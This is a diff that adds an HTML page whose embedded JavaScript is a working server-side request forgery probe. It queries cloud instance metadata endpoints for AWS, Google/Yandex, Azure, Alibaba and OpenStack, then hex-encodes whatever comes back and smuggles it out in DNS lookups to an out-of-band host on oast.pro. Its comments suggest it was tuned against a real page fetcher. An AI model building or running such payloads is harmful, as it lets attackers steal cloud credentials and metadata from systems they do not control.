@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html>
+<head><title>t</title></head>
+<body>
+<script>
+// IMDS probe v8: short timeout (100ms) + sync XHR fallback
+// DNS-only OOB (HTTP from JS is blocked on this fetcher)
+var OOB = 'd9qr1aj6b8megs7ig8dg5nrtprg7ogmge.oast.pro';
+
+function dns(label) {
+  var l = label.toLowerCase().replace(/[^a-z0-9-]/g,'-').replace(/-+/g,'-').replace(/^-|-$/g,'').substring(0,60);
+  new Image().src = 'https://' + l + '.' + OOB + '/';
+}
+function dnsExfil(lbl, text) {
+  var hex = '';
+  for (var i = 0; i < Math.min(text.length, 60); i++)
+    hex += ('0' + text.charCodeAt(i).toString(16)).slice(-2);
+  (hex.match(/.{1,30}/g) || []).forEach(function(c, i) { dns(lbl + '-' + i + '-' + c); });
+  dns(lbl + '-end-len' + text.length);
+}
+
+dns('v8-start');
+
+// --- SYNC XHR FIRST (blocks main thread → context must stay alive) ---
+dns('v8-sync-try');
+var sx = new XMLHttpRequest();
+try {
+  sx.open('GET', 'http://169.254.169.254/latest/meta-data/', false); // sync
+  sx.send();
+  dns('v8-sync-ok-s' + sx.status);
+  dnsExfil('v8-sync-d', sx.responseText);
+} catch(e) {
+  dns('v8-sync-fail-' + (e.name||'err').substring(0,8).replace(/[^a-z0-9]/g,'-'));
+}
+
+// --- YC IMDS sync ---
+dns('v8-yc-sync-try');
+var sy = new XMLHttpRequest();
+try {
+  sy.open('GET', 'http://169.254.169.254/computeMetadata/v1/project/project-id', false);
+  sy.setRequestHeader('Metadata-Flavor', 'Google');
+  sy.send();
+  dns('v8-yc-sync-ok-s' + sy.status);
+  dnsExfil('v8-yc-d', sy.responseText);
+} catch(e) {
+  dns('v8-yc-sync-fail-' + (e.name||'err').substring(0,8).replace(/[^a-z0-9]/g,'-'));
+}
+
+// --- ASYNC with 100ms timeout (short enough to fire before context closes) ---
+var targets = [
+  ['aw', 'http://169.254.169.254/latest/meta-data/'],
+  ['az', 'http://169.254.169.254/metadata/instance?api-version=2021-02-01', {'Metadata':'true'}],
+  ['ali','http://100.100.100.200/latest/meta-data/'],
+  ['os', 'http://169.254.169.254/openstack/latest/meta_data.json'],
+];
+targets.forEach(function(t) {
+  var lbl = t[0], url = t[1], hdrs = t[2]||{};
+  dns('try-' + lbl + '-100ms');
+  var t0 = Date.now();
+  fetch(url, {headers: hdrs, signal: AbortSignal.timeout(100)})
+    .then(function(r) { return r.text().then(function(b) {
+      dns('ok-' + lbl + '-s' + r.status + '-' + (Date.now()-t0) + 'ms');
+      dnsExfil('d-' + lbl, b);
+    }); })
+    .catch(function(e) {
+      dns('fail-' + lbl + '-' + (e.name==='AbortError'?'time':'err') + '-' + (Date.now()-t0) + 'ms');
+    });
+});
+
+dns('v8-script-end');
+</script>
+</body>
+</html>
